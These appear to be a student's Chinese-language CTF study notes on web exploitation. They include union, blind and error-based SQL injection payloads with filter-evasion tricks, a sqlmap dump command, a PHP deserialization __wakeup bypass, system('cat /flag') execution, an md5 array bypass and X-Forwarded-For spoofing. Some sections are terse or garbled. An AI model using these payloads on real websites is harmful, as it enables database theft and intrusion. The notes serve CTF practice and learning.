### CTF入门的一些知识和范式



#### SQL注入

1. 先找到是数字型注入还是字符型注入 并判断闭合符

​	id = 1 的回显是否和 id = 2-1 一样 -> 判断是何种注入

​	?id=1' and 1=2--+ -> 判断‘是否为闭合符

2. 找到回显位

​	?id=-1' union select 1,2,3--+ -> 判断哪一位为回显位

3. 开始利用范式找到表名（例如第2位为回显位）（结果为fl4g）

​	union select 1,database(),group_concat(**table_name**)from information_schema.tables where table_schema=**database()**--+

```
union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()--+
```



4. 再利用范式从表名中找到列名    （结果为fllllag）

   union select 1,database(),group_concat(**column_name**)from information_schema.columns where table_name=**'fl4g'**--+

   ```
   union select 1,database(),group_concat(column_name)from information_schema.columns where table_name='fl4g'--+
   ```

   

5. 最后利用select从列名中找到flag

   union select 1,database(),group_concat(fllllag)from fl4g--+

6. 跳过过滤：

   空格：转换为/**/

   union：双写为ununionion







#### 布尔盲注

没有回显位时可用此方法注入 需用python脚本自动化此方法 但是待学习python脚本编程

1. 先找到数据库名的长度

   ```sql
   ?id=1 and length(database())=1
   #query_error
   ...
   ?id=1 and length(database())=4
   #query_success
   #库名长度为4
   
   ```

   

2. 在利用substr函数挨个找到database()的名字

   ```sql
   ?id=1 and substr(database(),1,1)=‘a’
   #query_error
   ...
   ?id=1 and substr(database(),1,1)=‘s’
   #query_success
   #库名第一个字符是s
   ...
   ?id=1 and substr(database(),4,1)=‘i’
   #query_success
   #库名第四个字符是i
   #库名是sqli
   
   ```

3. 此后便根据此找到database 的 表个数 表名 列个数 列名 内容 即可

   **人工巨麻烦，必须找到利用python脚本的方法**

#### 报错注入

当网站开启错误调试信息时可用此方法注入（不然只能盲注）

假设一个网站传入为name = xxxx, pass = xxxx

1. 利用范式找到database中的所有表名（此处pass被注释）

   name=1'and updatexml(1,concat(0x7e,(**SELECT group_concat(table_name) from information_schema.tables where table_schema=database()))**,1)--+&pass=xxxxx --+

   熟悉吗？接下来加粗部分同SQL注入即可

#### 反序列化

如何跳过__wakeup函数？

O:6:"HaHaHa":***3***:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}

如上所示 对象本该只有两个属性 admin 和 passwd ，将数量设置为3即可在反序列化中跳过wakeup函数。

#### sqlmap

python sqlmap.py -u "http://node4.anna.nssctf.cn:28366/?id=1" --dump

#### PHP伪协议

如何传入文件？

system(cat /flag)

#### 文件包含

posh不要随便加空格

如何绕过waf？

先利用伪协议查看index.php的编码

找到条件并跳过即可

#### md5数组绕过

```
if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
} 
```

此时传入两个数组即可，因为数组可以被传入md5，但是会返回NULL。

#### XXF

从本地页面跳转使用

X-Forwarded-For: 127.0.0.1

Referer:127.0.0.1

遇到将字符作为语句执行 可以将该字符设置为system("cat /f*")
